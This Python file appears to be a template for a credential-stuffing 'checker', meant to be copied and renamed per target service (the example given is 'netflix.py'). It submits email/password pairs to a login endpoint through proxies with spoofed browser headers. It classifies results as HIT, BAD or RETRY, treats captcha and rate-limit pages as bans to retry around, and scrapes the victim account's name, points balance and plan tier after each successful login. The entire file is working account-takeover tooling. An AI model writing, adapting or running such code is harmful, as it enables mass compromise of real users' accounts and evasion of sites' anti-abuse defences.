"""
Universal API Module Template
Copy this file and rename it to your target (e.g. 'netflix.py').
"""

import aiohttp
import re
import asyncio
from typing import Optional, Tuple, Union

# --- CONFIGURATION ---
TARGET_URL_LOGIN = "https://example.com/api/login"
TARGET_URL_LANDING = "https://example.com/dashboard"
TARGET_URL_STATS_1 = "https://example.com/api/points"
TARGET_URL_STATS_2 = "https://example.com/api/billing"

# Optional: Map raw values to cleaner output (e.g. 1 -> Free, 2 -> Premium)
VALUE_MAP = {
    "tier_1": "Free",
    "tier_2": "Premium",
    "tier_3": "Vip"
}

async def interface(
    session: aiohttp.ClientSession,
    email: str,
    password: str,
    proxy: Optional[str] = None,
    **kwargs
) -> Union[int, Tuple[int, str]]:
    """
    Main entry point for the runner.
    Returns:
    0 = Success (HIT)
    1 = Fail (BAD)
    2 = Retry (ERROR/BAN)
    """
    
    # 1. Headers - Mimic a real browser
    headers = {
        "Host": "example.com",
        "Content-Type": "application/x-www-form-urlencoded", # or application/json
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Origin": "https://example.com",
        "Referer": "https://example.com/login",
        "Connection": "close" # Important for rotation
    }

    # 2. Payload - The data sent to the login endpoint
    payload = {
        "username_field": email,
        "password_field": password,
        "remember_me": "true",
        "csrf_token": "" # If needed, scrape this first
    }
    
    try:
        # [STEP 1] Login Request
        # Use allow_redirects=False to capture the 302 redirect manually if needed
        async with session.post(
            TARGET_URL_LOGIN,
            data=payload, # Use json=payload if the API expects JSON
            headers=headers,
            proxy=proxy,
            timeout=20, 
            allow_redirects=False 
        ) as response:
            
            # --- SUCCESS LOGIC ---
            # Scenario A: 302 Redirect (Common for standard logins)
            if response.status == 302:
                location = response.headers.get("Location", "")
                # Verify the redirect goes to a logged-in area
                if "dashboard" in location or "home" in location:
                    return await scrape_data(session, location, proxy)
            
            # Scenario B: 200 OK (API returns JSON or page loads directly)
            if response.status == 200:
                text = await get_text_safe(response)

                # Check for explicit success indicators
                if "Welcome back" in text or '"success":true' in text:
                    return await scrape_data(session, TARGET_URL_LANDING, proxy)

                # --- FAILURE LOGIC ---
                # Check for explicit failure messages
                if "Incorrect password" in text or "Invalid email" in text:
                    return 1 # FAIL
                
                # --- RETRY LOGIC (WAF / Ban) ---
                if "Access Denied" in text or "Captcha" in text or "Rate Limit" in text:
                    return 2 # RETRY

            # Handle Server Errors
            if response.status in [403, 429, 500, 502, 503]:
                return 2 

            # Default: If we don't know what happened, Retry
            return 2 

    except Exception:
        return 2

async def scrape_data(session, landing_url, proxy) -> Tuple[int, str]:
    """
    Scrapes account details after a successful login.
    """
    try:
        # [STEP 2] Stabilize Session
        # Visit the landing page to set any necessary cookies
        if landing_url:
            try:
                async with session.get(landing_url, proxy=proxy, timeout=15) as res:
                    await res.read()
            except Exception:
                pass 

        stats_data = {}
        
        # [STEP 3] Fetch Data Page (e.g. Points/Profile)
        try:
            async with session.get(TARGET_URL_STATS_1, proxy=proxy, timeout=15, headers={"Connection": "close"}) as res:
                text = await get_text_safe(res)
                
                # Check if session died
                if "login" in str(res.url) or "Session Expired" in text:
                    return 0, "Login Success (Session Lost)"

                # --- REGEX EXTRACTION ---
                
                # Example: Extract Name -> <div class="name">John Doe</div>
                name_match = re.search(r'class="name">\s*(.*?)\s*<', text)
                if name_match: 
                    stats_data['Name'] = name_match.group(1).strip()

                # Example: Extract Points -> Balance: 1,250
                pt_match = re.search(r'Balance:\s*([\d,]+)', text)
                if pt_match: 
                    stats_data['Points'] = pt_match.group(1)
                else:
                    stats_data['Points'] = "0" # Default value for alignment

                # Example: Extract Plan -> <span id="plan">premium</span>
                plan_match = re.search(r'id="plan">\s*(.*?)\s*<', text)
                if plan_match:
                    raw_plan = plan_match.group(1).strip()
                    stats_data['Plan'] = VALUE_MAP.get(raw_plan, raw_plan)

        except Exception:
            pass 

        # --- BUILD OUTPUT ---
        if not stats_data:
            return 0, "Login Success (Stats Not Found)"

        # Define the order of keys for the output string
        # Format: Key: Value | Key: Value
        output_parts = []
        
        # Use .get() with defaults to ensure columns stay aligned even if data missing
        output_parts.append(f"Points: {stats_data.get('Points', '0')}")
        output_parts.append(f"Plan: {stats_data.get('Plan', 'Free')}")
        
        if 'Name' in stats_data: 
            output_parts.append(f"Name: {stats_data['Name']}")

        return 0, " | ".join(output_parts)

    except Exception as e:
        return 0, f"Login Success (Scraping Error: {str(e)})"

async def get_text_safe(response):
    """Helper to safely read response text with encoding fallback"""
    try:
        raw = await response.read()
    except aiohttp.ClientPayloadError:
        raw = b"" # Handle truncated responses
    
    try:
        return raw.decode('utf-8', errors='ignore')
    except:
        # Fallback for legacy sites
        return raw.decode('ISO-8859-1', errors='ignore')